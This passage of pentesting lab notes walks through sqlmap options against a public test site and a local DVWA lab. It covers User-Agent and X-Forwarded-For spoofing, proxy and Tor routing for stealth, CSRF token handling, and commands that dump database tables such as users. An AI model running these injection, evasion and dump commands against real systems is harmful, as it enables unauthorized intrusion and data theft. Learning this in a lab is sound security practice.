- `sqlmap -u "http://testphp.vulnweb.com/listproducts.php?cat=1" -A "Mozilla/5.0"` : This makes the request appear as if it came from a normal browser, helping to bypass filters that block "unknown" or automated tools.

üîç Explanation for You as a Pentester
- User-Agent Basics:
Every HTTP request from a browser includes a User-Agent string like "Mozilla/5.0 (Windows NT 10.0; Win64; x64)". It tells the server what kind of browser and OS you're using.
- Why It Matters in Pentesting:
Security tools like WAFs often block requests that look suspicious‚Äîespecially those coming from automated tools like SQLMAP. If SQLMAP sends its default User-Agent, it might get flagged or blocked.
- The -A Option in SQLMAP:
This lets you spoof the User-Agent to mimic a real browser. For example:
````
-A "Mozilla/5.0"
````
- This tricks the server into thinking the request is coming from a regular user, not a scanner.
- Real-World Use Case:
When testing a target behind Cloudflare or ModSecurity, using a browser-like User-Agent can help you slip past basic filters and get your payload through.

Want me to show you how to combine this with other evasion techniques like --random-agent, --headers, or tamper scripts? I can also help you document this in your GitHub portfolio with a clean markdown snippet and screenshot layout.




#### Random agent 


````
sqlmap -u "http://testphp.vulnweb.com/listproducts.php?cat=1" --random-agent --batch --dbs
````
<img width="1895" height="788" alt="image" src="https://github.com/user-attachments/assets/4210a8ba-0029-4d9e-adce-307134d06d91" />

`--random-agent` Instead of setting a fixed User-Agent manually, SQLMAP has a built-in list of common User-Agents. With `--random-agent` , SQLMAP will randomly choose one for each request.

- `sqlmap -u "http://testphp.vulnweb.com/listproducts.php?cat=1" --random-agent`  : This is useful when scanning targets that monitor traffic patterns. If every request uses the same User-Agent, it looks suspicious. By rotating them, we can avoid basic detection and appear more like genuine traffic.

üîç Why This Matters for You
- Traffic Fingerprinting:
Some WAFs and IDSs don‚Äôt just block based on payload‚Äîthey analyze traffic patterns. If every request has the same User-Agent, it screams ‚Äúautomated tool.‚Äù
- Built-in Rotation:
SQLMAP‚Äôs --random-agent pulls from a curated list of real-world User-Agent strings (Chrome, Firefox, Safari, etc.). Each request looks like it came from a different browser.
- Evasion Strategy:
This is a lightweight obfuscation tactic. It won‚Äôt bypass advanced behavioral analysis, but it‚Äôs great for dodging basic filters and logging systems that flag repetitive headers.
- When to Use:
- During recon or low-risk probing
- Against targets with basic WAFs
- When you want to reduce your footprint without crafting custom headers

üß† Pro Tip for Your Portfolio
Document both -A and --random-agent in your GitHub lab reports. Include:
- A short explanation of each
- Screenshots of intercepted requests (e.g., Burp Suite showing rotated User-Agents)
- A note on when and why you chose each option
Want help drafting that markdown section or organizing your folders for SQL injection labs? I can whip up a clean template for you.





#### Mobile
````
sqlmap -u "http://testphp.vulnweb.com/artists.php?artist=2" --mobile -v5
````
<img width="1199" height="779" alt="image" src="https://github.com/user-attachments/assets/a44a5d17-e205-406f-ae75-3ec6a36dcfb9" />

- `--mobile` Some websites deliver different content based on whether the user is on a desktop or mobile device. The `--mobile` option allows SQLMAP to send requests with a mobile browser User-Agent, such as Android Chrome or iPhone Safari.
- `sqlmap -u "http://testphp.vulnweb.com/artists.php?artist=2" --mobile` :  This can reveal vulnerabilities that are only visible in the mobile version of the site. Attackers often look for weak points in mobile-specific endpoints.




#### Header
````
sqlmap -u "http://testphp.vulnweb.com/listproducts.php?cat=1" \
       --headers="User-Agent: Firefox 1.0\nX-Forwarded-For: 127.0.0.1" -v5
````
<img width="808" height="632" alt="image" src="https://github.com/user-attachments/assets/20894fc3-fb08-4eda-9eca-6725875ebedf" />

- In IP `127.0.0.1` we can change to others IP like `127.0.0.2`.
- `--header` Headers are used to add custom headers to requests. This can be important for authentication, tracking, or controlling access.
   - What it does:
   - It lets you add custom HTTP headers to your requests. Headers are pieces of metadata sent with every HTTP request ‚Äî they tell the server things like: 
        - What browser you‚Äôre using `User-Agent`
        - Your IP address (if spoofed via `X-Forwarded-For`)
        - Authentication tokens
        - Language preferences, etc.
   - Why it matters:
   Many websites use headers for: 

        - Authentication (e.g., API keys or session tokens in Authorization header)
        - Tracking (e.g., logging user agents or IPs)
        - Access control (e.g., blocking certain IPs or browsers) 

- `-u`: Specifies the target URL.
- `--headers=`: Adds custom headers.
       - `User-Agent` : Firefox 1.0 ‚Üí Pretends you‚Äôre using an old version of Firefox.
       - `\n` : Newline separator (so we can add multiple headers).
       - `X-Forwarded-For: 127.0.0.1` : Tells the server you‚Äôre ‚Äúcoming from‚Äù localhost (which may bypass IP-based restrictions).

-  *Note*: The \n is important ‚Äî it separates multiple headers. In some shells or environments, you might need to use $'\n' or write each header on its own line. 



#### Method
--method
What it does:
It lets you force SQLMap to use a specific HTTP method (like GET, POST, PUT, DELETE, etc.) instead of letting SQLMap auto-detect it. 

Why it matters:
By default, SQLMap tries to guess which HTTP method the target expects. But sometimes it guesses wrong ‚Äî especially with modern APIs or complex web apps ‚Äî so you need to manually tell it which method to use. 

### HTTP Methods: GET, POST, PUT, DELETE

| HTTP Method | Purpose / Action                         | Effect                                                  | Idempotent? | Example Use                          |
|-------------|-------------------------------------------|---------------------------------------------------------|-------------|---------------------------------------|
| **GET**     | Retrieve (read) data from the server     | Should not change anything on the server                | ‚úÖ Yes      | View a product list, read a profile   |
| **POST**    | Send data to create or process something | Changes something on the server (not idempotent)        | ‚ùå No       | Register a user, submit form, upload  |
| **PUT**     | Replace or update a resource             | If exists ‚Üí update, if not ‚Üí create                     | ‚úÖ Yes      | Update a user‚Äôs profile with new info |
| **DELETE**  | Remove a resource from the server        | Deletes the item; repeating has the same effect         | ‚úÖ Yes      | Delete a user account or product      |



````
sqlmap -r '/home/k4n0ng/Desktop/request.raw'  --method="POST"
````
<img width="1357" height="693" alt="image" src="https://github.com/user-attachments/assets/c0d1f22a-d31d-41e2-ba1c-0e0ec4dbb763" />

<img width="1369" height="272" alt="image" src="https://github.com/user-attachments/assets/8b44a951-04e6-4f48-b844-fa2835677b76" />

--method="POST" ‚Äî force sqlmap to use the POST method for requests it sends, overriding the method present in the raw file (if different).
- **sqlmap will**:
    - Parse the raw request file for URL, host, headers, cookies and body.
    - Replace the HTTP method with POST if --method is specified (or keep the method from the file if you don‚Äôt specify --method).
    - Detect parameters in the URL query string, POST body, cookies, headers and treat them as injection candidates.
    - Run injection tests against those parameters (unless you limit them with -p).
    - Print results to the console and save session/results under ~/.local/share/sqlmap/output/.


#### More command with method
- Non-interactive, test and enumerate DBs (if injection found):
````
sqlmap -r /home/k4n0ng/Desktop/request.raw --method=POST --batch --dbs -v 2
````

- Only test parameter id:
````
sqlmap -r /home/k4n0ng/Desktop/request.raw --method=POST -p id --batch --dbs
````

- Override/add header (e.g., JSON content type):
````
sqlmap -r /home/k4n0ng/Desktop/request.raw --method=POST --headers="Content-Type: application/json" -p id --batch
````

- If we raw file is missing a POST body and you want to provide it inline:
````
sqlmap -r /home/k4n0ng/Desktop/request.raw --method=POST --data="username=admin&password=1234" -p username --batch
````
---


#### DATA
- `--data` : When working with POST requests, it‚Äôs often necessary to specify parameters sent in the body of the request. The `--data` option is used for this purpose.

- This command tells SQLMAP to test the parameter `id` with the value `1`.
POST parameters are more common than GET parameters in modern web applications, especially for login forms, search queries, and API calls.


````
sqlmap -u "http://testphp.vulnweb.com/" --data="cat=1" -v5
````
<img width="1066" height="787" alt="image" src="https://github.com/user-attachments/assets/a1d59dcf-5797-4369-bb5c-7ec6ca121925" />

<img width="907" height="804" alt="image" src="https://github.com/user-attachments/assets/864df4ac-4cd3-4e19-a133-5ad00f926ada" />

<img width="1410" height="801" alt="image" src="https://github.com/user-attachments/assets/b412a5db-9976-4b9d-8b14-c5c86debb1ba" />

- `--data="cat=1"` : the POST body to send. This tells sqlmap there is a form parameter cat with value 1 and makes cat a candidate for injection testing. The default content type used is application/x-www-form-urlencoded.


````
sqlmap -u "http://testphp.vulnweb.com/userinfo.php" --data="uname=test&pass=test"
````
<img width="1702" height="711" alt="image" src="https://github.com/user-attachments/assets/7bd7c562-a9b0-4730-adfc-2103d2971fd3" />

- --data="uname=test&pass=test" ‚Äî forces a POST request with the body uname=test&pass=test. sqlmap treats uname and pass as parameters to test for SQL injection.



##### How to make testing more reliable
1. Target specific param(s) (avoid unnecessary tests):
   - Test only uname:
````
sqlmap -u "http://testphp.vulnweb.com/userinfo.php" --data="uname=test&pass=test" -p uname --batch -v 2
````
   - Test both uname and pass:
````
sqlmap -u "http://testphp.vulnweb.com/userinfo.php" --data="uname=test&pass=test" -p uname,pass --batch -v 2
````

2. Use a captured raw request when cookies / headers matter:
    - Intercept the login POST in Burp, right-click ‚Üí ‚ÄúCopy as request‚Äù (raw) ‚Üí save as /home/k4n0ng/Desktop/login.raw. Then:
````
sqlmap -r /home/k4n0ng/Desktop/login.raw --batch -v 2
````
This preserves cookies, CSRF tokens, custom headers, and the exact body.

3. If the app uses JSON (instead of form data), send JSON and Content-Type header:
````
sqlmap -u "http://testphp.vulnweb.com/userinfo.php" --data='{"uname":"test","pass":"test"}' --headers="Content-Type: application/json" -p uname,pass --batch
````

4. Quick test of uname only (non-interactive):
````
sqlmap -u "http://testphp.vulnweb.com/userinfo.php" --data="uname=test&pass=test" -p uname --batch -v 2 --technique=BEU
````

5. If login requires an authenticated session (you have a cookie), include it:
````
sqlmap -u "http://testphp.vulnweb.com/userinfo.php" --data="uname=test&pass=test" -p uname --cookie="SESSION=abcd1234" --batch
````
---

#### param-del=PARA
`--para-del` SQLMAP assumes parameters are separated with an ampersand (`&`) by default, but not all applications use this convention. Some may use semicolons, commas, or other delimiters.

````
sqlmap -u "http://testphp.vulnweb.com/userinfo.php" \
       --data="uname=test;pass=test" \
       --param-del=";"
````
<img width="1676" height="769" alt="image" src="https://github.com/user-attachments/assets/dbf37f02-4791-4627-ae15-e9d0e6c49249" />

- Without using `--param-del` , SQLMAP might not parse the parameters correctly, potentially missing injection points. This flexibility is important for testing non-standard APIs or legacy systems.
- Matters for You
  ‚Ä¢ 	Non-Standard Parameter Formats:
While most modern web apps use  to separate parameters, legacy systems or custom APIs might use , , or even pipes (). SQLMAP needs to know how to split these correctly to test each one.
  ‚Ä¢ 	The  Option:
This tells SQLMAP what delimiter to use when parsing parameters. Without it, SQLMAP might treat the entire string as one parameter and miss injection points.

---


#### cookie=COOKIE
- Our target in this we use `DVWA`, Lets open our target in my docker :
<img width="1577" height="565" alt="image" src="https://github.com/user-attachments/assets/559c79b5-8f37-41de-82b7-15dba627d21e" />

- After in browser: http://localhost:8080/login.php , but in my kali: http://192.168.100.97:8080/login.php :
<img width="1307" height="832" alt="image" src="https://github.com/user-attachments/assets/a980d343-b0dd-49ce-af55-8dd4acc2e561" />

````
Username: admin
Password: password
````
- After `Login` -> `SQL Injection` -> and in User ID type `test` and summit:
<img width="1177" height="836" alt="image" src="https://github.com/user-attachments/assets/e2d27441-64f9-423a-8fa0-d0cc9e7985db" />

- After go to URL and copy: http://192.168.100.97:8080/vulnerabilities/sqli/?id=test&Submit=Submit#
<img width="1186" height="687" alt="image" src="https://github.com/user-attachments/assets/416adc69-1f16-4851-adb0-6de6c0911f48" />

- IN our `Terminal`:
````
sqlmap -u "http://192.168.100.97:8080/vulnerabilities/sqli/?id=test&Submit=Submit#"
````
<img width="1490" height="780" alt="image" src="https://github.com/user-attachments/assets/07e959fa-1faa-4c77-a75e-a6f1a389e870" />


- Check cookie:
<img width="816" height="104" alt="image" src="https://github.com/user-attachments/assets/9d528e43-af76-4565-aee8-0cd5c35320be" />

- In this don't know `cookie`, lets check: Go to our browser target: 
<img width="1287" height="817" alt="image" src="https://github.com/user-attachments/assets/c1c9fc33-49b9-41fe-ab37-fd96e712e8e4" />

<img width="1921" height="711" alt="image" src="https://github.com/user-attachments/assets/a3d04a08-0540-4237-91f4-ea508a4e5ba2" />
- This our `cookie`, lets copy name and cookie:
<img width="1238" height="336" alt="image" src="https://github.com/user-attachments/assets/ae880704-2146-49e5-a316-7cc6621ae97f" />

After this past this name (`PHPSESSID`) to our `Terminal` and copy the cookie (`n8gv1ji6u4vbiu48ebf320d1r6`) and past this cookie to `Terminal`:
<img width="871" height="74" alt="image" src="https://github.com/user-attachments/assets/ee480ccb-7269-4c66-ab47-266dcc75f9d5" />

<img width="1243" height="322" alt="image" src="https://github.com/user-attachments/assets/b0b39149-5c27-426e-8581-efa3f3676580" />

````
sqlmap -u "http://192.168.100.97:8080/vulnerabilities/sqli/?id=test&Submit=Submit#" --cookie="PHPSESSID=n8gv1ji6u4vbiu48ebf320d1r6; security=low"
````
<img width="1498" height="806" alt="image" src="https://github.com/user-attachments/assets/07443605-35a8-4a3a-8f24-b50540d0bbc8" />

- `--cookie="PHPSESSID=...; security=low"` : Adds a Cookie: header with the given cookies for every request sqlmap sends.

   - `PHPSESSID=...` : is the session identifier ‚Äî often required to remain logged in (DVWA login session).
   - `security=low` : is DVWA‚Äôs security-level cookie ‚Äî useful because DVWA behavior changes by that value (low = easier vulnerabilities). Cookies must be formatted like a browser header: `name=value; name2=value2`. Quoting the whole value in the shell (as you did) is correct.

##### More command 
1. Target only id and list DBs non-interactively:
````
sqlmap -u "http://192.168.100.97:8080/vulnerabilities/sqli/?id=test" \
       -p id \
       --cookie="PHPSESSID=n8gv1ji6u4vbiu48ebf320d1r6; security=low" \
       --dbs --batch -v 2
````

2. Enumerate tables after --dbs (replace <DBNAME> with what sqlmap returns):
````
sqlmap -u "http://192.168.100.97:8080/vulnerabilities/sqli/?id=test" \
       -p id \
       -D <DBNAME> --tables \
       --cookie="PHPSESSID=...; security=low" \
       --batch -v 2
````

3. Dump a specific table:
````
sqlmap -u "http://192.168.100.97:8080/vulnerabilities/sqli/?id=test" \
       -p id \
       -D <DBNAME> -T <TABLE> --dump \
       --cookie="PHPSESSID=...; security=low" \
       --batch -v 2
````

4. Or we can check it with `curl command`:
````
curl -I "http://192.168.100.97:8080/vulnerabilities/sqli/?id=test" \
     --cookie "PHPSESSID=n8gv1ji6u4vbiu48ebf320d1r6; security=low"
````

# Useful sqlmap Flags (cheat‚Äësheet)

| Flag / Option         | Purpose / Action                                      | Notes / When to use                                  |
|-----------------------|-------------------------------------------------------|------------------------------------------------------|
| `-p id`               | Focus testing on the `id` parameter                   | Reduces noise and speeds up scans. Use when you know target param(s). |
| `--batch`             | Auto-answer all prompts (non-interactive)             | Use in scripts or when you don't want interactive prompts. |
| `-v 2` / `-v 3`       | Readable verbosity levels                              | `-v2`/`-v3` show useful progress/payloads; `-v5`/`-v6` are very noisy. |
| `--random-agent`      | Rotate User-Agent header for each request             | Helps mimic different clients; useful for evasion in tests. |
| `--delay <sec>`       | Wait `<sec>` seconds between requests                  | Use to slow down scans to avoid WAF/rate limits.     |
| `--timeout <sec>`     | Set network timeout (seconds)                         | Increase if the server is slow or for time-based tests. |
| `--skip-urlencode`    | Send raw payloads without URL-encoding                | Use carefully when payload encoding must be preserved. |




#### cookie-del=COO
````
sqlmap -u "http://192.168.100.97:8080/vulnerabilities/sqli/?id=test&Submit=Submit" \
       --cookie="PHPSESSID=n8gv1ji6u4vbiu48ebf320d1r6; security=low"
````
<img width="1444" height="791" alt="image" src="https://github.com/user-attachments/assets/001e89bb-aa03-4960-a7f2-cf18b9aa72c1" />

<img width="1087" height="782" alt="image" src="https://github.com/user-attachments/assets/b36a6eec-0c42-4b0d-a0ab-9b46163c419a" />

<img width="1863" height="604" alt="image" src="https://github.com/user-attachments/assets/e2f126c0-6e0f-42d6-b5da-8818c8033940" />


````
sqlmap -u "http://192.168.100.97:8080/vulnerabilities/sqli/?id=test&Submit=Submit" \
       --cookie="PHPSESSID=n8gv1ji6u4vbiu48ebf320d1r6:security=low" \
       --cookie-del=":"
````
<img width="1695" height="742" alt="image" src="https://github.com/user-attachments/assets/9c207e1d-6f01-4238-a125-6a2ee3bcac9f" />


##### Replace the cookie value if your session expires:
1. Enumerate databases:
````
sqlmap -u "http://192.168.100.97:8080/vulnerabilities/sqli/?id=test" \
  -p id \
  --cookie="PHPSESSID=n8gv1ji6u4vbiu48ebf320d1r6; security=low" \
  --dbs --batch -v 2
````

2. List tables (after you see the DB name; DVWA commonly uses dvwa):
````
sqlmap -u "http://192.168.100.97:8080/vulnerabilities/sqli/?id=test" \
  -p id \
  -D dvwa --tables \
  --cookie="PHPSESSID=...; security=low" --batch -v 2
````

3. Show columns in a table (replace <TABLE>):
````
sqlmap -u "http://192.168.100.97:8080/vulnerabilities/sqli/?id=test" \
  -p id \
  -D dvwa -T <TABLE> --columns \
  --cookie="PHPSESSID=...; security=low" --batch -v 2
````

4. Dump table rows (only on authorized lab):
````
sqlmap -u "http://192.168.100.97:8080/vulnerabilities/sqli/?id=test" \
  -p id \
  -D dvwa -T users --dump \
  --cookie="PHPSESSID=...; security=low" --batch -v 2
````

- Check result:
````
ls -la /home/k4n0ng/.local/share/sqlmap/output/192.168.100.97
# view the main result file:
less /home/k4n0ng/.local/share/sqlmap/output/192.168.100.97/dump.txt
````


- Drop the unnecessary flag and add best practices:
````
sqlmap -u "http://192.168.100.97:8080/vulnerabilities/sqli/?id=1" \
  --cookie="PHPSESSID=n8gv1ji6u4vbiu48ebf320d1r6; security=low" \
  -p id \
  --batch \
  --dbs \
  -v 2
````
---



#### --cookie-del
- By default, SQLMap expects cookies to be separated by semicolons (;) ‚Äî which is the standard format defined by RFC 6265.
But some applications ‚Äî especially legacy systems, custom-built APIs, or internal tools ‚Äî use non-standard separators like:
- Pipe |
- Comma ,
- Colon :
- Space Or even custom strings

````
sqlmap -u "http://192.168.100.97:8080/vulnerabilities/sqli/?id=1" \
  --cookie="id=1|cat=2|name=test" \
  --cookie-del="|"
````
<img width="1674" height="743" alt="image" src="https://github.com/user-attachments/assets/f8f3d415-34ee-4718-8107-599e8bd69752" />


- Cookies are separated by |
- Without --cookie-del="|", SQLMap would treat the entire string as one malformed cookie.
- With it, SQLMap correctly identifies 3 separate cookies: id=1, cat=2, name=test.






#### --auth-type and --auth-cred 
````
sqlmap -u "http://192.168.100.97:8080/vulnerabilities/sqli/?id=test&Submit=Submit#" \
--auth-type="Basic" \
--auth-cred="admin:password"
````
<img width="1671" height="752" alt="image" src="https://github.com/user-attachments/assets/45bc6435-4f6a-41ac-92d3-98262ed53ef8" />

- Target Stack Info
  ‚Ä¢ 	Web Server: Apache 2.4.25
  ‚Ä¢ 	OS: Debian 9 (Stretch)
  ‚Ä¢ 	Language: PHP
  ‚Ä¢ 	DBMS: MySQL ‚â• 5.0 (MariaDB fork)
  ‚Ä¢ 	Injection Point:  parameter via GET
- Or we can add `-v5`

````
sqlmap -u "http://192.168.100.97:8080/vulnerabilities/sqli/?id=test&Submit=Submit#" \
--auth-type="Basic" \
--auth-cred="admin:password" -v5
````
<img width="807" height="788" alt="image" src="https://github.com/user-attachments/assets/4d42c359-86af-475c-905a-b73a0c97d9a2" />


#### --ignore-code
````
sqlmap -u "http://192.168.100.97:8080/vulnerabilities/sqli/?id=test&Submit=Submit#" --ignore-code=401,403,500
````
<img width="1632" height="714" alt="image" src="https://github.com/user-attachments/assets/a6c2ff4f-9d44-4677-869e-1636bbfe655b" />

- What it does:
   - `--ignore-code` tells SQLMap to ignore specific HTTP status codes during scanning.
   - In this example, it skips:
        - `401 Unauthorized`
        - `403 Forbidden`
        - `500 Internal Server Error`

- What does it useful:
   - - WAF Evasion:
Web Application Firewalls (WAFs) or security filters may return misleading error codes when an injection attempt is detected. SQLMap might interpret these as failures and stop scanning.
   - - False Negatives Prevention:
By ignoring these codes, SQLMap continues testing even if the server tries to block or mislead the scanner.


### Proxy
#### Proxy=PROXY
- ProxyScrape website
- Go to browser and type: `ProxyScrape`  or go direct link: https://proxyscrape.com/hello-again?ref=otnknze&gad_source=1&gad_campaignid=22811141512&gclid=Cj0KCQjwovPGBhDxARIsAFhgkwQSnkgc4ec39mxYS6n9aDAcsdSgOFGRq3V1TBZBRVeVpIvUSfDu8JkaAly5EALw_wcB
<img width="658" height="756" alt="image" src="https://github.com/user-attachments/assets/9d89a11f-a642-4840-9746-eba9f5b4f9c0" />

<img width="1228" height="731" alt="image" src="https://github.com/user-attachments/assets/15bbf702-2cff-4785-a912-8ea6e1e955ba" />

- Or go to direct link: https://proxyscrape.com/free-proxy-list
<img width="1122" height="775" alt="image" src="https://github.com/user-attachments/assets/6252c3cd-8f1e-4402-844e-6e063e4a2a23" />

<img width="1102" height="785" alt="image" src="https://github.com/user-attachments/assets/c49e4a08-51fa-438d-9861-0fd498387cc4" />

- Choose `portocol://ip:port` and click on `TXT` and click `Donloads` and after it downloads we will see this:
<img width="877" height="843" alt="image" src="https://github.com/user-attachments/assets/dc7e0b1e-a062-4e8a-9d71-8009254d8490" />


````
sqlmap -u "http://testphp.vulnweb.com/artists.php?artist=2" --proxy="http://185.221.160.200:80" -v 5
````
<img width="1033" height="767" alt="image" src="https://github.com/user-attachments/assets/102c0105-86b7-4431-b1e9-0e0e7227d338" />

<img width="1585" height="647" alt="image" src="https://github.com/user-attachments/assets/4c83ba35-5548-4ee2-bf75-c2f9e2cde985" />

| **Option**      | **Description**                                                           |
|-----------------|---------------------------------------------------------------------------|
| `-u`            | Specifies the target URL with the vulnerable parameter (`artist=2`).      |
| `--proxy=IP:PORT` | Routes traffic through a proxy server (`185.221.160.200:80`) for anonymity or interception. |
| `-v 5`          | Sets verbosity to maximum. Shows full HTTP requests and responses.         |






#### proxy-cred
````
sqlmap -u "http://testphp.vulnweb.com/artists.php?artist=2" \
--proxy="http://185.221.160.200:80" \
--proxy-cred="test:test"
````
<img width="1594" height="790" alt="image" src="https://github.com/user-attachments/assets/2e5725eb-9383-449b-bdd8-a25ee2a02e17" />

| **Option**           | **Description**                                                           |
|----------------------|---------------------------------------------------------------------------|
| `-u`                 | Specifies the target URL with the vulnerable parameter (`artist=2`).      |
| `--proxy=IP:PORT`    | Routes traffic through a proxy server (`185.221.160.200:80`).            |
| `--proxy-cred=user:pass` | Supplies proxy authentication credentials (`test:test`).                |




#### proxy-file
````
sqlmap -u "http://testphp.vulnweb.com/artists.php?artist=2" --proxy-file='/home/k4n0ng/Desktop/http_proxies.txt'
````
<img width="1375" height="816" alt="image" src="https://github.com/user-attachments/assets/868f6c07-161f-44aa-97e0-f5f50a06fea9" />

| Option          | Description                                                                 |
|-----------------|-----------------------------------------------------------------------------|
| `-u`            | Specifies the target URL with the vulnerable parameter (`artist=2`).        |
| `--proxy=IP:PORT` | Routes traffic through a single proxy server (`185.221.160.200:80`).      |
| `--proxy-cred=user:pass` | Supplies credentials for authenticated proxy (`test:test`).           |




#### proxy-frequency
````
sqlmap -u "http://testphp.vulnweb.com/artists.php?artist=2" --proxy-file='/home/k4n0ng/Desktop/http_proxies.txt' --proxy-freq=20
````
<img width="1596" height="798" alt="image" src="https://github.com/user-attachments/assets/7a392eee-9190-484b-8cfa-c9442f865451" />

- Why Use This Setup?
  ‚Ä¢ 	Bypass WAF/IPS Rate-Limiting:
Some firewalls block repeated requests from the same IP. Rotating proxies helps avoid detection.
  ‚Ä¢ 	Distribute Load:
Useful when scanning large targets or performing long-duration tests.
  ‚Ä¢ 	Stealth Scanning:
Each proxy handles a limited number of requests, reducing the chance of triggering alarms.

- But in this detect by `Cloudflar`.

##### More commands:
1. List Databases
````
sqlmap -u "http://testphp.vulnweb.com/artists.php?artist=2" \
  --proxy-file='/home/k4n0ng/Desktop/http_proxies.txt' \
  --proxy-freq=20 \
  --random-agent \
  --batch --dbs
````

2. List Tables in acuart Database
````
sqlmap -u "http://testphp.vulnweb.com/artists.php?artist=2" \
  --proxy-file='/home/k4n0ng/Desktop/http_proxies.txt' \
  --proxy-freq=20 \
  --random-agent \
  -D acuart --tables --batch
````

3. Dump users Table
````
sqlmap -u "http://testphp.vulnweb.com/artists.php?artist=2" \
  --proxy-file='/home/k4n0ng/Desktop/http_proxies.txt' \
  --proxy-freq=20 \
  --random-agent \
  -D acuart -T users --dump --batch
````

---

#### Tor Proxy
````
sudo apt install tor
````
<img width="1637" height="807" alt="image" src="https://github.com/user-attachments/assets/ba4de832-f1ea-4e9c-a801-7cd314a5c6eb" />

````
sudo apt install torbrowser-launcher
````
<img width="1740" height="799" alt="image" src="https://github.com/user-attachments/assets/19b69bd3-893d-4360-b6b4-01269150b909" />

- Launch tor browser:
````
torbrowser-launcher
````
<img width="1395" height="486" alt="image" src="https://github.com/user-attachments/assets/310fa2d6-8bb9-4b5b-a1fb-d05db631bfec" />

- Wait a few minutes it will finished downloads.
<img width="1375" height="767" alt="image" src="https://github.com/user-attachments/assets/fc2f4d95-47fe-4c91-b31a-275997c59792" />

- Now we get a `tor` browser and click `connect`.
<img width="1398" height="702" alt="image" src="https://github.com/user-attachments/assets/c2716716-e727-4dd2-aa1f-0ea09dfe220c" />

````
sqlmap -u "http://testphp.vulnweb.com/artists.php?artist=2" --tor
````
<img width="1892" height="648" alt="image" src="https://github.com/user-attachments/assets/e29fb3b5-e139-4b49-879b-b6b423e17733" />

- Check `Tor`:
<img width="1902" height="697" alt="image" src="https://github.com/user-attachments/assets/cbd68e3c-1b21-4c65-afcc-36c5072f2202" />

---


#### Delay Between Requests
````
sqlmap -u "http://testphp.vulnweb.com/listproducts.php?cat=1" \
       --delay=10
````
<img width="971" height="712" alt="image" src="https://github.com/user-attachments/assets/ec5eba6d-3f4c-4af8-9142-fa50d6e04fc6" />

- Use This Setup?
  ‚Ä¢ 	Bypass Rate-Limiting: Slows down your scan to avoid triggering WAF/IPS rules.
  ‚Ä¢ 	Avoid Detection: Reduces the chance of being flagged by intrusion detection systems.
  ‚Ä¢ 	Prevent Server Overload: Useful when testing fragile or resource-limited targets.




#### delay, tor port and tor type:
````
sqlmap -u "http://testphp.vulnweb.com/artists.php?artist=2" --tor --delay=10 --tor-port=8080 --tor-type=SOCKS5
````


- This setup uses the Tor network to anonymize your SQL injection scan, adds a delay between requests, and specifies the Tor proxy type and port.

| **Option**          | **Description**                                                           |
|---------------------|---------------------------------------------------------------------------|
| `-u`                | Target URL with the vulnerable parameter (`artist=2`).                      |
| `--tor`             | Enables routing through the Tor network.                                    |
| `--delay=10`        | Adds a 10-second delay between each request to avoid detection.             |
| `--tor-port=8080`   | Specifies the port Tor is listening on (default is usually 9050 or 9150).   |
| `--tor-type=SOCKS5` | Specifies the proxy type used by Tor (SOCKS5 is standard).                  |




#### Proxy Types Explained
| **Proxy Type** | **Description**                                                           |
|----------------|---------------------------------------------------------------------------|
| `http`         | Standard proxy, great for debugging with tools like Burp Suite.             |
| `https`        | Encrypted proxy, useful for secure tunnels.                                 |
| `socks4`       | Lightweight proxy, less common but still supported.                         |
| `socks5`       | Advanced proxy with support for authentication and UDP. Ideal for Tor.      |





---



#### CSRF Token Support
- Check our token:
````
curl -s http://192.168.100.97:8080/login.php | grep -i 'input'
````
<img width="1848" height="165" alt="image" src="https://github.com/user-attachments/assets/2f9cca60-35f7-4d56-b898-77fd5b7c4504" />

- Show my name token is `user_token`

````
sqlmap -u "http://192.168.100.97:8080/login.php" \
       --method=POST \
       --data="username=admin&password=admin" \
       --csrf-token="user_token" \
       --csrf-url="http://192.168.100.97:8080/login.php" \
       --csrf-method=GET \
       --batch
````
<img width="1883" height="800" alt="image" src="https://github.com/user-attachments/assets/929b0fdf-87a9-400c-aa8d-89c8f5410712" />

<img width="1896" height="665" alt="image" src="https://github.com/user-attachments/assets/be5484ce-396c-4596-b35d-237e73402eb7" />


| **Option**                 | **Description**                                                           |
|----------------------------|---------------------------------------------------------------------------|
| `-u`                       | Target URL for SQL injection testing.                                     |
| `--method=POST`            | Specifies that the request uses the POST method.                          |
| `--data="..."`             | Provides the POST body with login credentials or form data.               |
| `--csrf-token="user_token"`| Tells SQLMap the name of the CSRF token field (e.g., `user_token`).        |
| `--csrf-url="..."`         | URL where SQLMap fetches the CSRF token (often the login page).           |
| `--csrf-method=GET`        | Specifies that the token is fetched using a GET request.                  |
| `--batch`                  | Runs SQLMap in non-interactive mode (auto-confirms prompts).             |

- Use This Setup?
  ‚Ä¢ 	CSRF Protection: Many modern apps require a valid CSRF token for each request. Without it, SQLMap requests will be rejected.
  ‚Ä¢ 	Session Validity: Helps maintain authenticated sessions during testing.
  ‚Ä¢ 	Real-World Scenarios:
     ‚Ä¢ 	Login forms
     ‚Ä¢ 	Profile updates
     ‚Ä¢ 	Admin panels with CSRF protection

---


#### CSRF Retries

````
sqlmap -u "http://192.168.100.97:8080/login.php" \
       --method=POST \
       --data="username=admin&password=admin&user_token=" \
       --csrf-token="user_token" \
       --csrf-url="http://192.168.100.97:8080/login.php" \
       --csrf-retries=2 \
       --batch
````
<img width="1591" height="794" alt="image" src="https://github.com/user-attachments/assets/753ac2ca-af33-4f74-bd64-6d6c91504312" />

<img width="1606" height="642" alt="image" src="https://github.com/user-attachments/assets/2ec72997-f31d-4971-812d-0643ddedad4c" />

---

#### ignore-redirects
````
sqlmap -u "http://192.168.100.97:8080/vulnerabilities/sqli/?id=helo&Submit=Submit#" --ignore-redirects
````
<img width="1905" height="694" alt="image" src="https://github.com/user-attachments/assets/d96629bd-14cf-4637-bac8-362732818eaa" />

<img width="1891" height="441" alt="image" src="https://github.com/user-attachments/assets/24f8392c-5f44-4d49-adc6-6be711ce0757" />

| **Option**              | **Description**                                                           |
|-------------------------|---------------------------------------------------------------------------|
| `-u`                    | Target URL with the vulnerable `id` parameter.                              |
| `hello`                 | Test value for the `id` parameter ‚Äî SQLMap will try to inject here.          |
| `Submit=Submit#`        | Mimics a form submission; `#` is often used to terminate the query.          |
| `--ignore-redirects`    | Prevents SQLMap from following HTTP 3xx redirects.                          |


#### Handling Timeouts
````
sqlmap -u "http://192.168.100.97:8080/vulnerabilities/sqli/?id=helo&Submit=Submit#" \
       --timeout=200 \
       --retries=6 \    
       --ignore-timeouts
````
<img width="1720" height="781" alt="image" src="https://github.com/user-attachments/assets/3cdfc256-1cdc-41f7-9dc7-73fa92823837" />

| **Option**              | **Description**                                                           |
|-------------------------|---------------------------------------------------------------------------|
